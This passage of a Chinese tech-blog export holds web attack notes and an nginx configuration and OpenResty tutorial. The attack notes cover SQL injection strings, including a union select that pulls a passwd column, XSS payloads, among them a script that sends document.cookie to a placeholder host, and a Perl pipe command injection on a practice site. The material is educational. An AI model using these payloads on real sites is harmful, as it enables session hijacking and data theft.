<p><a href="https://blog.csdn.net/qq_33616529/article/details/79061608">参考链接</a></p>
<p>需要的选项主要是以下三个：</p>
<ul>
<li><code>ssi</code>: 默认值off，启用ssi时将其设为on</li>
<li><code>ssi_silent_errors</code>: 默认值off，开启后在处理SSI文件出错时不输出错误提示”[an error occurred while processing the directive]”。</li>
<li><code>ssi_types</code>: 默认是text&#x2F;html，所以如果需支持html，则不需要设置这句，如果需要支持shtml则需要设置：<code>ssi_types</code> text&#x2F;shtml<br>三个参数可以放在http, server或location作用域下。</li>
</ul>
<h2 id="2-sql"><a href="#2-sql" class="headerlink" title="2. sql"></a>2. sql</h2><h3 id="2-1-攻"><a href="#2-1-攻" class="headerlink" title="2.1. 攻"></a>2.1. 攻</h3><ul>
<li>一般对于sql注入，使用<code>&#39; or 1=1; #</code></li>
<li><code>&#39;</code>结束前面的参数引号</li>
<li><code>or 1=1</code>令整个where失效</li>
<li><code>;</code>作为结束</li>
<li><code>#</code>或者<code>--</code>将后续的字符串变成注释</li>
<li><code>order by [n]</code>可以使用n（从1开始）来判断数据库一共有几列，大于某个n会报错，就证明有n列</li>
<li><code>select * from table1 union select 1,2,passwd,4,5 from table2</code>: 使用union联表可以将另一个表的数据查出来拼接到整体数据中</li>
</ul>
<h2 id="3-js"><a href="#3-js" class="headerlink" title="3. js"></a>3. js</h2><h3 id="3-1-攻"><a href="#3-1-攻" class="headerlink" title="3.1. 攻"></a>3.1. 攻</h3><h4 id="1-XSS跨站攻击"><a href="#1-XSS跨站攻击" class="headerlink" title="(1) XSS跨站攻击"></a>(1) XSS跨站攻击</h4><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
<p>参考链接: <a href="https://zhuanlan.zhihu.com/p/26177815">浅谈XSS攻击的那些事（附常用绕过姿势）</a></p>
<p><strong>示例1: cookie劫持</strong></p>
<ul>
<li>通过html注入实现窃取cookie</li>
<li>如果页面直接将输入的值没有做转移展示在页面上，可以触发注入</li>
<li>页面打开后，会立即请求<code>http://xxx.xxx.xxx?[cookie_of_current]</code>，将当前页面的cookie发送给了一个网址</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://xxx.xxx.xxx?&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>示例2: 页面劫持</strong></p>
<ul>
<li>通过html注入实现打开此网页自动跳转另一个页面</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;http://xxx.xxx.xxx&quot;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>示例3: 通过可植入代码的标签劫持</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 图片加载失败做操作 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;w.123&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(&quot;hey!&quot;)&#x27;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 鼠标移动做操作 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmousemove</span>=<span class="string">&quot;alert(&#x27;hey&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 鼠标移动到块上做操作 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(&#x27;hey&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="4-perl"><a href="#4-perl" class="headerlink" title="4. perl"></a>4. perl</h2><h3 id="4-1-攻"><a href="#4-1-攻" class="headerlink" title="4.1. 攻"></a>4.1. 攻</h3><ul>
<li><p>perl语言搭建的网站比较典型的是请求以<code>xxx.pl</code>结尾</p>
</li>
<li><p>用open函数也可像命令行一样,打开和使用管道.</p>
</li>
<li><p>语法为:</p>
</li>
</ul>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">open</span>(MYVAR, <span class="string">&quot;mode&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>mode有如下两种模式:<ul>
<li><code>|command</code>: 表示对MYVAR的输出相当于对command的输入.</li>
<li><code>command|</code>: 表示command的输出作为对MYVAR的输入.</li>
</ul>
</li>
</ul>
<p>pl可以在服务器上执行命令，比如请求下面语句，就在服务器上执行了ls命令并输出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.hackthissite.org/missions/realistic/11/page.pl?page=|ls|</span><br></pre></td></tr></table></figure>

<h1 id="二、特定软件的攻防"><a href="#二、特定软件的攻防" class="headerlink" title="二、特定软件的攻防"></a>二、特定软件的攻防</h1><h2 id="1-apache"><a href="#1-apache" class="headerlink" title="1. apache"></a>1. apache</h2><h3 id="1-1-htaccess"><a href="#1-1-htaccess" class="headerlink" title="1.1. htaccess"></a>1.1. htaccess</h3><p><a href="https://baike.baidu.com/item/htaccess/1645473?fr=aladdin">参考链接</a></p>
<h4 id="1-1-1-攻"><a href="#1-1-1-攻" class="headerlink" title="1.1.1. 攻"></a>1.1.1. 攻</h4><h4 id="1-1-2-防"><a href="#1-1-2-防" class="headerlink" title="1.1.2. 防"></a>1.1.2. 防</h4><p>关闭htaccess功能，需要修改httpd.conf，设置<code>AllowOverride none</code>，将会忽略所有的<code>.htaccess</code>配置</p>
<h1 id="三、特定系统的功防"><a href="#三、特定系统的功防" class="headerlink" title="三、特定系统的功防"></a>三、特定系统的功防</h1><h1 id="四、通用知识"><a href="#四、通用知识" class="headerlink" title="四、通用知识"></a>四、通用知识</h1><h2 id="1-防止谷歌抓取页面"><a href="#1-防止谷歌抓取页面" class="headerlink" title="1. 防止谷歌抓取页面"></a>1. 防止谷歌抓取页面</h2><ul>
<li>一般会在网站根目录放上一个<code>robots.txt</code>，里面定义了哪些目录不允许抓取</li>
</ul>
<h2 id="2-内嵌网页的模式可以通过file-path-to-file来访问磁盘"><a href="#2-内嵌网页的模式可以通过file-path-to-file来访问磁盘" class="headerlink" title="2. 内嵌网页的模式可以通过file:///path/to/file来访问磁盘"></a>2. 内嵌网页的模式可以通过<code>file:///path/to/file</code>来访问磁盘</h2><ul>
<li>windows可以写成<code>file:///C:/</code></li>
<li>linux可以写成<code>file:///home/xxx</code></li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx配置和源码分析</title>
    <url>/blogs/2021-04-23-nginx/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><ul>
<li>nginx官方文档: <a href="https://nginx.org/en/docs/">https://nginx.org/en/docs/</a></li>
<li>openresty官方文档: <a href="https://github.com/openresty/lua-nginx-module">https://github.com/openresty/lua-nginx-module</a></li>
</ul>
<h1 id="一、配置"><a href="#一、配置" class="headerlink" title="一、配置"></a>一、配置</h1><h2 id="1-配置实例"><a href="#1-配置实例" class="headerlink" title="1. 配置实例"></a>1. 配置实例</h2><h3 id="1-1-80端口转443"><a href="#1-1-80端口转443" class="headerlink" title="1.1. 80端口转443"></a>1.1. 80端口转443</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 default_server;</span><br><span class="line">    listen [::]:80 default_server;</span><br><span class="line">    rewrite ^ https://$http_host$request_uri? permanent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-请求url代理到另一个地址"><a href="#1-2-请求url代理到另一个地址" class="headerlink" title="1.2. 请求url代理到另一个地址"></a>1.2. 请求url代理到另一个地址</h3><ul>
<li>proxy_pass会自动将get参数和post参数带到代理的地址去，不需要加上<code>$query_string</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /test &#123;</span><br><span class="line">    # 代理地址如果不带后面地址，将会请求 http://127.0.0.1:1234/test</span><br><span class="line">    proxy_pass      http://127.0.0.1:1234;</span><br><span class="line"></span><br><span class="line">    # 代理地址如果带后面地址，将会请求 http://127.0.0.1:1234/aaa</span><br><span class="line">    proxy_pass      http://127.0.0.1:1234/aaa;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 假设请求的地址为 http://x.x.x.x/test/bbb</span><br><span class="line">location /test/ &#123;</span><br><span class="line">    # 代理地址如果不带后面地址，将会请求 http://127.0.0.1:1234/test/bbb</span><br><span class="line">    proxy_pass      http://127.0.0.1:1234;</span><br><span class="line"></span><br><span class="line">    # 代理地址如果带后面地址，将会请求 http://127.0.0.1:1234/aaabbb</span><br><span class="line">    # 由于location加了/，proxy_pass会删除/test/，剩下bbb拼接到后面url</span><br><span class="line">    proxy_pass      http://127.0.0.1:1234/aaa;</span><br><span class="line"></span><br><span class="line">    # 代理地址如果带后面地址，将会请求 http://127.0.0.1:1234/aaa/bbb</span><br><span class="line">    proxy_pass      http://127.0.0.1:1234/aaa/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-3-支持websocket"><a href="#1-3-支持websocket" class="headerlink" title="1.3. 支持websocket"></a>1.3. 支持websocket</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">map $http_upgrade $connection_upgrade &#123;</span><br><span class="line">    default          keep-alive;  #默认为keep-alive 可以支持 一般http请求</span><br><span class="line">    &#x27;websocket&#x27;      upgrade;     #如果为websocket 则为 upgrade 可升级的。</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">server &#123;</span><br><span class="line">    listen       8002;</span><br><span class="line">    listen       [::]:8002;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">            proxy_pass      http://127.0.0.1:8000;</span><br><span class="line">            proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">            proxy_set_header Connection $connection_upgrade;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-4-配置tcp代理"><a href="#1-4-配置tcp代理" class="headerlink" title="1.4. 配置tcp代理"></a>1.4. 配置tcp代理</h3><ul>
<li>需要使用<code>stream</code>模块</li>
<li>下面配置将本地8888的tcp代理到外部8889，可以通过<code>0.0.0.0:8889</code>访问到<code>127.0.0.1:8888</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stream &#123;</span><br><span class="line">    upstream tcpServer &#123;</span><br><span class="line">        server 127.0.0.1:8888;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        listen 8889;</span><br><span class="line">        proxy_pass tcpServer;</span><br><span class="line">        proxy_connect_timeout 10s;</span><br><span class="line">        proxy_timeout 24h;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-5-root和alias"><a href="#1-5-root和alias" class="headerlink" title="1.5. root和alias"></a>1.5. root和alias</h3><ul>
<li>root可以配置到<code>http</code>、<code>server</code>、<code>location</code></li>
<li>alias只能配置到<code>location</code></li>
<li>root配置访问的是 <code>root + location</code></li>
<li>alias访问的只有 <code>alias</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /test &#123;</span><br><span class="line">    # 请求http://x.x.x.x/test  访问 /var/www/html/test</span><br><span class="line">    # 请求http://x.x.x.x/test/ 访问 /var/www/html/test/</span><br><span class="line">    root      /var/www/html;</span><br><span class="line"></span><br><span class="line">    # 请求http://x.x.x.x/test  访问 /var/www/html</span><br><span class="line">    # 请求http://x.x.x.x/test/ 访问 /var/www/html/</span><br><span class="line">    alias     /var/www/html;</span><br><span class="line"></span><br><span class="line">    # 请求http://x.x.x.x/test  访问 /var/www/html/</span><br><span class="line">    # 请求http://x.x.x.x/test/ 访问 /var/www/html//</span><br><span class="line">    alias     /var/www/html/;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location /test/ &#123;</span><br><span class="line">    # 请求http://x.x.x.x/test  无法访问</span><br><span class="line">    # 请求http://x.x.x.x/test/ 访问 /var/www/html/test/</span><br><span class="line">    root      /var/www/html;</span><br><span class="line"></span><br><span class="line">    # 请求http://x.x.x.x/test/aaa 访问 /var/www/htmlaaa</span><br><span class="line">    alias     /var/www/html;</span><br><span class="line"></span><br><span class="line">    # 请求http://x.x.x.x/test/aaa 访问 /var/www/html/aaa</span><br><span class="line">    alias     /var/www/html/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="1-6-反向代理"><a href="#1-6-反向代理" class="headerlink" title="1.6. 反向代理"></a>1.6. 反向代理</h3><ul>
<li>keepalive为每个工作进程中缓存的到上游的空闲保持连接的最大数量，超过会关闭最近最少使用的连接</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream http_proxy &#123;</span><br><span class="line">    server 127.0.0.1:8080;</span><br><span class="line"></span><br><span class="line">    keepalive 16;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    ...</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://http_proxy;</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Connection &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-安全配置"><a href="#2-安全配置" class="headerlink" title="2. 安全配置"></a>2. 安全配置</h2><p>限制不安全请求方法，拒绝接受除POST和GET，HEAD以外的请求方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ($request_method !~ ^(GET|POST)$ ) &#123;</span><br><span class="line">    return 405;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>去除nginx指纹信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server_tokens off;</span><br><span class="line">proxy_hide_header X-Powered-By; #隐藏powered-by，如果使用反向代理，也可以通过 proxy_hide_header 指令隐藏它</span><br></pre></td></tr></table></figure>

<p>防止溢出，给所有客户端配置buffer容许最大值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">client_body_buffer_size 1K;</span><br><span class="line">client_header_buffer_size 1k;</span><br><span class="line">client_max_body_size 1k;</span><br><span class="line">large_client_header_buffers 2 1k;</span><br></pre></td></tr></table></figure>

<p>控制iframe，防止iframe注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add_header  X-Frame-Options  SAMEORIGIN; #设置iframe内容必须同源</span><br></pre></td></tr></table></figure>

<p>XSS防护配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add_header  X-XSS-Protection  &quot;1; mode=block&quot;; #启用内置XSS filter</span><br><span class="line">add_header  Content-Security-Policy  &quot;default-src &#x27;self&#x27;; img-src &#x27;self&#x27; *.alicdn.com; object-src &#x27;none&#x27;; script-src &#x27;self&#x27; *.alicdn.com; style-src &#x27;self&#x27; *.alicdn.com; frame-ancestors &#x27;self&#x27;; base-uri &#x27;self&#x27;; form-action &#x27;self&#x27;&quot;; #启用内容安全策略，减少XSS攻击</span><br></pre></td></tr></table></figure>

<p>限制仅使用HTTPS访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add_header  Strict-Transport-Security &quot;max-age=31536000; includeSubDomains&quot;; #(HSTS) 告诉浏览器该站点只能通过 HTTPS 访问，如果使用了子域，也建议对任何该站点的子域强制执行此操作。</span><br></pre></td></tr></table></figure>

<p>cookie信息安全</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add_header  Set-Cookie &quot;Path=/; HttpOnly; Secure&quot;;</span><br><span class="line">proxy_cookie_path / &quot;/; httponly; secure; SameSite=None&quot;; #反向代理时要设置参数解决Cookie跨域丢失</span><br></pre></td></tr></table></figure>

<p>跨域请求设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 通过配置Access-Control-Allow-Origin参数可以指定哪些域可以访问你的服务器，这个值要么是* 要么是带协议端口号确定的值， *.xx.com都是错误的值。</span><br><span class="line">*.xx.com</span><br><span class="line">set $cors &quot;&quot;;</span><br><span class="line">if ($http_origin ~* (.*\.atpool.com)) &#123;</span><br><span class="line">  set $cors $http_origin;</span><br><span class="line">&#125;</span><br><span class="line">add_header Access-Control-Allow-Origin $cors;</span><br><span class="line">add_header Access-Control-Allow-Methods &quot;GET,POST,OPTIONS,DELETE,PUT&quot;;</span><br><span class="line">add_header Access-Control-Allow-Credentials true;</span><br><span class="line">add_header Access-Control-Allow-Headers *;</span><br><span class="line">if ($request_method = &quot;OPTIONS&quot;) &#123;</span><br><span class="line">  return 204;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加密与证书设置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 只容许TLS1.2及以上版本，加密算法只容许强加密算法</span><br><span class="line">ssl_certificate cert/xx.com.pem;</span><br><span class="line">ssl_certificate_key cert/xx.com.key;</span><br><span class="line">ssl_session_timeout 5m;</span><br><span class="line">ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;</span><br><span class="line"># 只启用TLS1.2 以上</span><br><span class="line">ssl_protocols TLSv1.2 TLSv1.3;</span><br><span class="line">ssl_prefer_server_ciphers on;</span><br></pre></td></tr></table></figure>

<p>禁止nginx服务器目录列表功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">autoindex off;</span><br></pre></td></tr></table></figure>

<h2 id="3-配置详解"><a href="#3-配置详解" class="headerlink" title="3. 配置详解"></a>3. 配置详解</h2><h3 id="3-1-反向代理配置"><a href="#3-1-反向代理配置" class="headerlink" title="3.1. 反向代理配置"></a>3.1. 反向代理配置</h3><ul>
<li>配置代理请求缓存，如果为on，nginx会将代理过程中的数据做缓存，缓存到<code>proxy_temp</code>目录下</li>
<li>此配置和配置到http&#x2F;server&#x2F;location中</li>
<li>处理的是单个连接中，如果上下游速度不匹配而导致的数据可以进行缓存，加快上游或下游的写包速度，而非缓存用于同样请求的响应</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxy_request_buffering off; # 关闭代理请求缓存</span><br><span class="line">proxy_buffering off; # 关闭代理响应缓存</span><br></pre></td></tr></table></figure>

<h3 id="3-2-so-keepalive-keepalive配置"><a href="#3-2-so-keepalive-keepalive配置" class="headerlink" title="3.2. so_keepalive keepalive配置"></a>3.2. so_keepalive keepalive配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80 so_keepalive=2m:10s:3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>为连接保持的设置，上面配置连接空闲2min后发送keepalive包，间隔10s发一次，3次没有响应连接关闭</li>
</ul>
<h1 id="二、命令详解"><a href="#二、命令详解" class="headerlink" title="二、命令详解"></a>二、命令详解</h1><h2 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1. 常用命令"></a>1. 常用命令</h2><h2 id="2-配置检查"><a href="#2-配置检查" class="headerlink" title="2. 配置检查"></a>2. 配置检查</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; nginx -t</span><br><span class="line">2022/09/01 00:49:22 [warn] 4992#4992: could not build optimal types_hash, you should increase either types_hash_max_size: 1024 or types_hash_bucket_size: 64; ignoring types_hash_bucket_size</span><br><span class="line">2022/09/01 00:49:22 [emerg] 4992#4992: &quot;types_hash_max_size&quot; directive is not allowed here in /etc/nginx/nginx.conf:144</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf test failed</span><br></pre></td></tr></table></figure>

<h1 id="三、openrestry"><a href="#三、openrestry" class="headerlink" title="三、openrestry"></a>三、openrestry</h1><h2 id="1-和nginx的区别"><a href="#1-和nginx的区别" class="headerlink" title="1. 和nginx的区别"></a>1. 和nginx的区别</h2><p>OpenResty（也称为 ngx_openresty）是一个全功能的 Web 应用服务器。它打包了标准的 Nginx 核心，很多的常用的第三方模块，以及它们的大多数依赖项。</p>
<p>通过揉和众多设计良好的 Nginx 模块，OpenResty 有效地把 Nginx 服务器转变为一个强大的 Web 应用服务器，基于它开发人员可以使用 Lua 编程语言对 Nginx 核心以及现有的各种 Nginx C 模块进行脚本编程，构建出可以处理一万以上并发请求的极端高性能的 Web 应用。</p>
<h2 id="2-安装和运行"><a href="#2-安装和运行" class="headerlink" title="2. 安装和运行"></a>2. 安装和运行</h2><h3 id="2-1-docker"><a href="#2-1-docker" class="headerlink" title="2.1. docker"></a>2.1. docker</h3><ul>
<li>官方镜像如下</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull openresty/openresty</span><br></pre></td></tr></table></figure>

<h4 id="1-运行"><a href="#1-运行" class="headerlink" title="1) 运行"></a>1) 运行</h4><ul>
<li>使用命令运行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -p 8080:80 -p 443:443 -d -i openresty/openresty</span><br></pre></td></tr></table></figure>

<h4 id="2-开发"><a href="#2-开发" class="headerlink" title="2) 开发"></a>2) 开发</h4><ul>
<li>先拷贝对应的目录到本地</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p ./usr/local/openresty/nginx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">openresty配置</span></span><br><span class="line">docker cp openresty:/usr/local/openresty/nginx/conf ./usr/local/openresty/nginx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">静态界面</span></span><br><span class="line">docker cp openresty:/usr/local/openresty/nginx/html ./usr/local/openresty/nginx</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">logs</span></span><br><span class="line">docker cp openresty:/usr/local/openresty/nginx/logs ./usr/local/openresty/nginx</span><br><span class="line"></span><br><span class="line">mkdir -p ./etc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nginx配置</span></span><br><span class="line">docker cp openresty:/etc/nginx ./etc</span><br></pre></td></tr></table></figure>

<ul>
<li>编辑一个<code>openresty-compose.yml</code></li>
</ul>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">openresty:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">openresty</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&#x27;openresty/openresty:latest&#x27;</span></span><br><span class="line">    <span class="attr">network_mode:</span> <span class="string">&#x27;host&#x27;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./usr/local/openresty/nginx/conf:/usr/local/openresty/nginx/conf:rw</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./usr/local/openresty/nginx/html:/usr/local/openresty/nginx/html:rw</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./usr/local/openresty/nginx/logs:/usr/local/openresty/nginx/logs:rw</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./etc/nginx:/etc/nginx:rw</span></span><br><span class="line">    <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">privileged:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span>     <span class="comment"># 开机启动</span></span><br></pre></td></tr></table></figure>

<ul>
<li>运行</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose -f openresty-compose.yml up -d</span><br></pre></td></tr></table></figure>

<h4 id="3-lua支持"><a href="#3-lua支持" class="headerlink" title="3) lua支持"></a>3) lua支持</h4><ul>
<li>编辑<code>/usr/local/openresty/nginx/conf/nginx.conf</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    # 在http块下添加下面的代码</span><br><span class="line">    lua_socket_read_timeout  5m;</span><br><span class="line">    lua_code_cache  on;</span><br><span class="line">    # /usr/local/openresty/nginx/conf/lua/?.lua 自定义lua文件，使用require时，字符串会替换问号，所以只能有一个问号</span><br><span class="line">    # /usr/local/openresty/lualib/?.lua 系统的lua文件</span><br><span class="line">    lua_package_path  &#x27;/usr/local/openresty/nginx/conf/lua/?.lua;/usr/local/openresty/lualib/?.lua;&#x27;;</span><br><span class="line">    # 系统的lua的c库</span><br><span class="line">    lua_package_cpath  &#x27;/usr/local/openresty/luajit/lib/?.so;/usr/local/openresty/luajit/lib/?.so;&#x27;;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>新增<code>/usr/local/openresty/nginx/conf/lua/test.lua</code>写入如下内容</li>
</ul>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> _M = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_M:run</span><span class="params">()</span></span></span><br><span class="line">    ngx.say(<span class="string">&quot;&lt;p&gt;hello, world&lt;/p&gt;&quot;</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> _M</span><br></pre></td></tr></table></figure>

<ul>
<li>编辑<code>/etc/nginx/conf.d/default.conf</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  localhost;</span><br><span class="line"></span><br><span class="line">    #charset koi8-r;</span><br><span class="line">    location = /test &#123;</span><br><span class="line">        content_by_lua_block &#123;</span><br><span class="line">            local test = require &quot;test&quot;</span><br><span class="line">            test.run()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>访问<code>http://localhost/test</code>就能看到<code>hello, world</code>了</li>
</ul>
<h1 id="四、源码分析"><a href="#四、源码分析" class="headerlink" title="四、源码分析"></a>四、源码分析</h1><h2 id="1-几个结构的生命周期和关系"><a href="#1-几个结构的生命周期和关系" class="headerlink" title="1. 几个结构的生命周期和关系"></a>1. 几个结构的生命周期和关系</h2><h3 id="1-1-ngx-http-request-t-代表一次http请求"><a href="#1-1-ngx-http-request-t-代表一次http请求" class="headerlink" title="1.1. ngx_http_request_t 代表一次http请求"></a>1.1. ngx_http_request_t 代表一次http请求</h3><p><img src="/2023-05-29-01.jpg"></p>
<ul>
<li>和其他结构的代码关系</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ngx_http.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ngx_http_request_s</span>     <span class="type">ngx_http_request_t</span>;</span><br><span class="line"><span class="comment">// ngx_http_request.h</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ngx_http_request_s</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">ngx_connection_t</span>                 *connection;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">ngx_http_upstream_t</span>              *upstream;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">ngx_pool_t</span>                       *pool;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">ngx_http_connection_t</span>            *http_connection;</span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ngx_http_request_t</code>代表一次http请求</li>
<li>一次<code>ngx_connection_t</code>可以给多个<code>ngx_http_request_t</code>使用</li>
<li>每个<code>ngx_http_request_t</code>必须依赖于一个<code>ngx_connection_t</code>，并且持有<code>r-&gt;connection</code></li>
<li>每个<code>ngx_http_request_t</code>拥有自己的内存池<code>r-&gt;pool</code>，当一次请求结束后会进行释放</li>
</ul>
<h4 id="1-创造"><a href="#1-创造" class="headerlink" title="(1) 创造"></a>(1) 创造</h4><ul>
<li>在<code>ngx_http_wait_request_handler</code>中进行构造，存放到<code>ngx_connection_t</code>的<code>data</code>中</li>
<li>每个http请求接收的回调中创建</li>
</ul>
